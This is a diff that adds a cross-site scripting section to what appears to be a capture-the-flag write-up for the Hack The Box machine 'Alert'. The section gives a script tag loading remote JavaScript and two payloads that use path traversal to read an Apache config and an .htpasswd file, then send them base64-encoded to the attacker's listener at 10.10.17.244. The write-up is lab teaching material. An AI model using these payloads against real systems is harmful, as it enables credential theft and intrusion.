@@ -161,3 +161,57 @@
 
             This subdomain "http://statistics.alert.htb" requires credentials for access it.
 
+## Cross Site Scripting
+
+???+ Danger "Cross Site Scripting"
+
+    === ":octicons-file-code-16: test.md"
+
+        ``` js
+        <script src="http://10.10.17.244:3000/pwn1.js"></script>
+        ```
+
+    === ":octicons-bug-16: pwn1.js"
+
+        ``` js
+        var req = new XMLHttpRequest();
+        req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf', false);
+        req.send();
+
+        var exfil = new XMLHttpRequest();
+        exfil.open('GET', 'http://10.10.17.244:3000/?content=' + btoa(req.responseText), true);
+        exfil.send();
+        ```
+
+        ``` mermaid
+        sequenceDiagram
+        autonumber
+        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test.md"
+        Alert - 10.129.231.188-->>Hacker - 10.10.17.244: Looks for the file "pwn1.js"
+        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "pwn1.js"
+        Alert - 10.129.231.188->>Hacker - 10.10.17.244: Returns the file "/etc/apache2/sites-available/000-default.conf"
+        ```
+
+    === ":octicons-bug-16: pwn2.js"
+
+        ``` js
+        var req = new XMLHttpRequest();
+        req.open('GET', 'http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd', false);
+        req.send();
+
+        var exfil = new XMLHttpRequest();
+        exfil.open('GET', 'http://10.10.17.244:3000/?content=' + btoa(req.responseText), true);
+        exfil.send();
+        ```
+
+        ``` mermaid
+        sequenceDiagram
+        autonumber
+        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "test.md"
+        Alert - 10.129.231.188-->>Hacker - 10.10.17.244: Looks for the file "pwn2.js"
+        Hacker - 10.10.17.244->>Alert - 10.129.231.188: Send the file "pwn2.js"
+        Alert - 10.129.231.188->>Hacker - 10.10.17.244: Returns the file "/var/www/statistics.alert.htb/.htpasswd"
+        ```
+
+
+
